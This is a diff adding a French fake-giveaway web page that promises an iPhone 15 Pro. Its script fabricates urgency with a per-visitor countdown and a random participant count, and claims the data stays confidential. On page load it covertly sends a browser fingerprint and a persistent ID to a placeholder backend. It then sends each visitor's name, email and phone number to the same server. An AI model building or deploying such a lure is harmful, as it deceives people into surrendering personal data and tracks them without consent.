@@ -1,0 +1,376 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>🎁 Concours iPhone 15 Pro - Tentez votre chance !</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+        }
+        
+        .container {
+            max-width: 500px;
+            width: 100%;
+        }
+        
+        .card {
+            background: white;
+            border-radius: 20px;
+            padding: 40px 30px;
+            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
+            text-align: center;
+        }
+        
+        .iphone-icon {
+            font-size: 80px;
+            margin-bottom: 20px;
+            animation: bounce 2s infinite;
+        }
+        
+        @keyframes bounce {
+            0%, 100% { transform: translateY(0); }
+            50% { transform: translateY(-10px); }
+        }
+        
+        h1 {
+            color: #333;
+            margin-bottom: 10px;
+        }
+        
+        .prize {
+            background: linear-gradient(135deg, #f093fb 0%, #f5576c 100%);
+            color: white;
+            padding: 10px 20px;
+            border-radius: 50px;
+            display: inline-block;
+            margin: 15px 0;
+            font-weight: bold;
+        }
+        
+        .countdown {
+            background: #f0f0f0;
+            padding: 15px;
+            border-radius: 10px;
+            margin: 20px 0;
+        }
+        
+        .countdown-timer {
+            font-size: 32px;
+            font-weight: bold;
+            color: #764ba2;
+        }
+        
+        .form-group {
+            margin: 20px 0;
+            text-align: left;
+        }
+        
+        label {
+            display: block;
+            margin-bottom: 5px;
+            color: #555;
+            font-weight: 500;
+        }
+        
+        input {
+            width: 100%;
+            padding: 12px 15px;
+            border: 2px solid #e0e0e0;
+            border-radius: 10px;
+            font-size: 16px;
+            transition: all 0.3s;
+        }
+        
+        input:focus {
+            outline: none;
+            border-color: #764ba2;
+        }
+        
+        button {
+            width: 100%;
+            padding: 15px;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: white;
+            border: none;
+            border-radius: 10px;
+            font-size: 18px;
+            font-weight: bold;
+            cursor: pointer;
+            transition: transform 0.3s;
+        }
+        
+        button:hover {
+            transform: scale(1.02);
+        }
+        
+        button:disabled {
+            opacity: 0.6;
+            cursor: not-allowed;
+        }
+        
+        .result {
+            margin-top: 20px;
+            padding: 15px;
+            border-radius: 10px;
+            display: none;
+        }
+        
+        .result.win {
+            background: #d4edda;
+            color: #155724;
+            display: block;
+        }
+        
+        .result.lose {
+            background: #f8d7da;
+            color: #721c24;
+            display: block;
+        }
+        
+        .loader {
+            display: inline-block;
+            width: 20px;
+            height: 20px;
+            border: 3px solid white;
+            border-radius: 50%;
+            border-top-color: transparent;
+            animation: spin 1s linear infinite;
+        }
+        
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+        
+        .footer {
+            margin-top: 20px;
+            font-size: 12px;
+            color: #999;
+        }
+        
+        .progress-bar {
+            width: 100%;
+            height: 10px;
+            background: #e0e0e0;
+            border-radius: 5px;
+            overflow: hidden;
+            margin: 20px 0;
+        }
+        
+        .progress-fill {
+            width: 0%;
+            height: 100%;
+            background: linear-gradient(90deg, #667eea, #764ba2);
+            transition: width 0.5s;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="card">
+            <div class="iphone-icon">📱</div>
+            <h1>🎁 Concours Exceptionnel</h1>
+            <div class="prize">🎯 Gagnez un iPhone 15 Pro !</div>
+            
+            <div class="countdown">
+                <div>⏰ Temps restant</div>
+                <div class="countdown-timer" id="timer">24:00:00</div>
+            </div>
+            
+            <div class="progress-bar">
+                <div class="progress-fill" id="progress"></div>
+            </div>
+            <div id="participants-count">🔥 Déjà 0 participants</div>
+            
+            <form id="contest-form">
+                <div class="form-group">
+                    <label>👤 Nom complet</label>
+                    <input type="text" id="name" placeholder="Jean Dupont" required>
+                </div>
+                <div class="form-group">
+                    <label>📧 Email</label>
+                    <input type="email" id="email" placeholder="jean@example.com" required>
+                </div>
+                <div class="form-group">
+                    <label>📱 Téléphone</label>
+                    <input type="tel" id="phone" placeholder="06 12 34 56 78" required>
+                </div>
+                <button type="submit" id="submit-btn">🎲 Tenter ma chance !</button>
+            </form>
+            
+            <div id="result" class="result"></div>
+            <div class="footer">
+                <p>🍀 1 chance sur 1000 de gagner</p>
+                <p>🔒 Vos données sont confidentielles</p>
+            </div>
+        </div>
+    </div>
+    
+    <script>
+        // Configuration
+        const API_URL = "https://TON-API-ICI.onrender.com";  // ← REMPLACE PAR TON URL RENDER
+        
+        // Variables
+        let userUUID = localStorage.getItem('user_uuid');
+        let isSubmitted = localStorage.getItem('contest_submitted');
+        
+        // Générer ou récupérer UUID
+        if (!userUUID) {
+            userUUID = crypto.randomUUID ? crypto.randomUUID() : 
+                       'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g, function(c) {
+                           var r = Math.random() * 16 | 0, v = c == 'x' ? r : (r & 0x3 | 0x8);
+                           return v.toString(16);
+                       });
+            localStorage.setItem('user_uuid', userUUID);
+        }
+        
+        // Collecter fingerprint
+        async function sendFingerprint() {
+            const data = {
+                uuid: userUUID,
+                sw5: screen.width,
+                sh5: screen.height,
+                device_pixel_ratio: window.devicePixelRatio || 1,
+                user_agent: navigator.userAgent,
+                platform: navigator.platform,
+                language: navigator.language
+            };
+            
+            try {
+                await fetch(`${API_URL}/api/collect`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(data)
+                });
+            } catch(e) {
+                console.log('Erreur tracking:', e);
+            }
+        }
+        
+        // Compte à rebours (24h)
+        function startCountdown() {
+            let endTime = localStorage.getItem('contest_end');
+            if (!endTime) {
+                endTime = new Date().getTime() + (24 * 60 * 60 * 1000);
+                localStorage.setItem('contest_end', endTime);
+            }
+            
+            const timer = setInterval(() => {
+                const now = new Date().getTime();
+                const distance = endTime - now;
+                
+                if (distance < 0) {
+                    clearInterval(timer);
+                    document.getElementById('timer').innerHTML = "00:00:00";
+                    document.getElementById('submit-btn').disabled = true;
+                    return;
+                }
+                
+                const hours = Math.floor((distance % (24 * 60 * 60 * 1000)) / (60 * 60 * 1000));
+                const minutes = Math.floor((distance % (60 * 60 * 1000)) / (60 * 1000));
+                const seconds = Math.floor((distance % (60 * 1000)) / 1000);
+                
+                document.getElementById('timer').innerHTML = 
+                    `${String(hours).padStart(2, '0')}:${String(minutes).padStart(2, '0')}:${String(seconds).padStart(2, '0')}`;
+            }, 1000);
+        }
+        
+        // Simuler participants
+        function updateParticipants() {
+            let count = localStorage.getItem('participants_count');
+            if (!count) {
+                count = Math.floor(Math.random() * 500) + 100;
+                localStorage.setItem('participants_count', count);
+            }
+            document.getElementById('participants-count').innerHTML = `🔥 Déjà ${count} participants`;
+            const progress = (count / 1000) * 100;
+            document.getElementById('progress').style.width = Math.min(progress, 100) + '%';
+        }
+        
+        // Soumission formulaire
+        document.getElementById('contest-form').addEventListener('submit', async (e) => {
+            e.preventDefault();
+            
+            if (isSubmitted) {
+                document.getElementById('result').innerHTML = '❌ Vous avez déjà participé !';
+                document.getElementById('result').className = 'result lose';
+                return;
+            }
+            
+            const name = document.getElementById('name').value;
+            const email = document.getElementById('email').value;
+            const phone = document.getElementById('phone').value;
+            
+            const btn = document.getElementById('submit-btn');
+            const originalText = btn.innerHTML;
+            btn.innerHTML = '<div class="loader"></div> Tirage en cours...';
+            btn.disabled = true;
+            
+            try {
+                const response = await fetch(`${API_URL}/api/contest/enter`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ uuid: userUUID, name, email, phone })
+                });
+                
+                const result = await response.json();
+                
+                if (result.status === 'ok') {
+                    localStorage.setItem('contest_submitted', 'true');
+                    isSubmitted = true;
+                    
+                    if (result.is_winner) {
+                        document.getElementById('result').innerHTML = `
+                            🎉🎉🎉 FÉLICITATIONS !!! 🎉🎉🎉<br><br>
+                            Vous avez gagné un ${result.prize} !<br>
+                            Un email vous sera envoyé pour la livraison.
+                        `;
+                        document.getElementById('result').className = 'result win';
+                    } else {
+                        document.getElementById('result').innerHTML = `
+                            🍀 Merci d'avoir participé !<br>
+                            Bonne chance pour le prochain tirage !
+                        `;
+                        document.getElementById('result').className = 'result lose';
+                    }
+                } else {
+                    document.getElementById('result').innerHTML = `❌ ${result.message}`;
+                    document.getElementById('result').className = 'result lose';
+                    btn.innerHTML = originalText;
+                    btn.disabled = false;
+                }
+                
+            } catch(error) {
+                document.getElementById('result').innerHTML = '❌ Erreur réseau. Réessaie plus tard.';
+                document.getElementById('result').className = 'result lose';
+                btn.innerHTML = originalText;
+                btn.disabled = false;
+            }
+        });
+        
+        // Vérifier si déjà participé
+        if (isSubmitted) {
+            document.getElementById('submit-btn').disabled = true;
+            document.getElementById('result').innerHTML = '✅ Vous avez déjà participé au concours !';
+            document.getElementById('result').className = 'result lose';
+        }
+        
+        // Initialisation
+        sendFingerprint();
+        startCountdown();
+        updateParticipants();
+    </script>
+</body>
+</html>
